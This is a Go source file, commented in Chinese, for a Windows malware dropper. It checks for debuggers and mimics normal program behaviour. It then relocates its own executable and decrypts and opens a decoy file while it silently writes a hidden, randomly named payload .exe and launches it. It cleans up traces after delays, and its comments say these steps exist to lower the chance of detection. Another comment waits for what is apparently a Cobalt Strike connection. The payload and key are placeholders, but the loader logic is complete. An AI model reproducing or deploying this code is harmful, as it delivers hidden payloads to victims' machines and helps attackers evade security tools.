package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
)

// base64的解码函数
func decodeBase64(encoded string) (string, error) {
	// 解码Base64编码的字符串
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	// 将字节切片转换为字符串
	return string(data), nil
}

// 解密函数
func aesDecrypt(encryptedData string, key []byte) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(encryptedData)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// 清理临时文件
func cleanupTemp(tempPath string) {
	// 延迟清理，避免立即删除行为特征
	go func() {
		time.Sleep(3 * time.Second)
		// 分步删除，降低检测概率
		os.Remove(tempPath)
	}()
}

// 设置文件属性
func setFileAttribs(filePath string) {
	// 延迟执行，避免连续敏感操作
	go func() {
		time.Sleep(1 * time.Second)
		cmd := exec.Command("cmd", "/c", "attrib", "+h", filePath)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
	}()
}

// 生成随机字符串
func generateRandomString(length int) (string, error) {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	if length <= 0 {
		return "", fmt.Errorf("长度必须大于0")
	}

	// 创建一个足够大的字节切片来存储随机字母
	b := make([]byte, length)
	// 使用crypto/rand生成安全随机数
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("生成随机数失败: %w", err)
	}

	// 将每个字节替换为letters中的一个字母
	for i := 0; i < length; i++ {
		b[i] = letters[b[i]%byte(len(letters))]
	}
	return string(b), nil
}

// 简单反调试检查
func checkEnvironment() bool {
	// 检查调试器进程
	debuggerProcs := []string{"x64dbg", "ollydbg", "ida", "windbg"}
	for _, proc := range debuggerProcs {
		if _, err := exec.LookPath(proc); err == nil {
			return false
		}
	}
	return true
}

// 模拟正常程序行为
func normalBehavior() {
	// 随机延迟，模拟正常程序启动
	time.Sleep(time.Duration(100+generateRandomDelay()) * time.Millisecond)

	// 执行一些正常的系统调用
	os.Getwd()
	os.Getenv("PATH")
}

func generateRandomDelay() int {
	b := make([]byte, 1)
	rand.Read(b)
	return int(b[0]) % 500
}

func main() {
	// 反调试检查
	if !checkEnvironment() {
		return
	}

	// 模拟正常行为
	normalBehavior()

	// 文件名和密钥
	fName := "fileName"
	key := "randomKey"
	enPayload := "encryptPayload"
	enFile := "encryptFile"
	// 动态构建路径，避免硬编码特征
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = os.Getenv("TEMP")
	}

	// 生成随机目录和文件名
	randomDir, _ := generateRandomString(6)
	randomName, _ := generateRandomString(8)

	// 构建payload路径
	payloadDir := filepath.Join(userProfile, randomDir)
	os.MkdirAll(payloadDir, 0755)
	payloadPath := filepath.Join(payloadDir, randomName+".exe")

	// 构建临时路径
	tmpName, _ := generateRandomString(10)
	tmpPath := filepath.Join(os.TempDir(), tmpName+".tmp")
	// 把当前文件移动到临时路径
	selfFile, _ := os.Executable()
	err := os.Rename(selfFile, tmpPath)
	if err != nil {
		pf := selfFile[0:2]
		randomString, _ := generateRandomString(10)
		tmpPath = pf + "\\" + randomString
		err = os.Rename(selfFile, tmpPath)
		if err != nil {
			// 静默失败，不显示错误信息
		}
	}
	// 解密文件内容
	payloadData, err := aesDecrypt(enPayload, []byte(key))
	if err != nil {
		return
	}
	fileData, err := aesDecrypt(enFile, []byte(key))
	if err != nil {
		return
	}

	// 释放正常文件运行
	f, err := os.Create(fName)
	if err != nil {
		return
	}

	if _, err := f.Write(fileData); err != nil {
		f.Close()
		return
	}

	// 确保文件写入完成
	f.Sync()
	f.Close()

	// 短暂延迟确保文件系统刷新
	time.Sleep(100 * time.Millisecond)

	// 当前路径
	currentPath, _ := os.Getwd()
	fullPath := filepath.Join(currentPath, fName)

	// 使用start命令打开文件，让系统自动选择合适的程序
	cmd := exec.Command("cmd", "/c", "start", "", fullPath)
	// 创建的子进程的窗口将被隐藏。
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()

	// 3.延迟释放和执行payload
	payloadDone := make(chan bool, 1)

	go func() {
		defer func() { payloadDone <- true }()

		// 延迟执行，避免连续敏感操作
		time.Sleep(2 * time.Second)

		// 创建payload文件
		pf, err := os.Create(payloadPath)
		if err != nil {
			return
		}

		if _, err := pf.Write(payloadData); err != nil {
			pf.Close()
			return
		}
		pf.Sync()
		pf.Close()

		// 验证文件是否成功创建
		if info, err := os.Stat(payloadPath); err != nil || info.Size() == 0 {
			return
		}

		// 设置执行权限
		os.Chmod(payloadPath, 0755)

		// 短暂延迟
		time.Sleep(500 * time.Millisecond)

		// 设置文件属性
		setFileAttribs(payloadPath)

		// 再次延迟后执行
		time.Sleep(1 * time.Second)

		// 尝试执行payload
		cmd := exec.Command(payloadPath)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
		if err != nil {
			// 如果直接执行失败，尝试通过cmd执行
			cmd2 := exec.Command("cmd", "/c", payloadPath)
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd2.Start()
		}

		// 等待一段时间确保payload启动
		time.Sleep(2 * time.Second)
	}()

	// 4.清理临时文件
	cleanupTemp(tmpPath)

	// 5.等待payload执行完成或超时
	select {
	case <-payloadDone:
		// payload执行完成，再等待一段时间确保CS连接建立
		time.Sleep(5 * time.Second)
	case <-time.After(15 * time.Second):
		// 15秒超时，防止程序永远不退出
	}
}
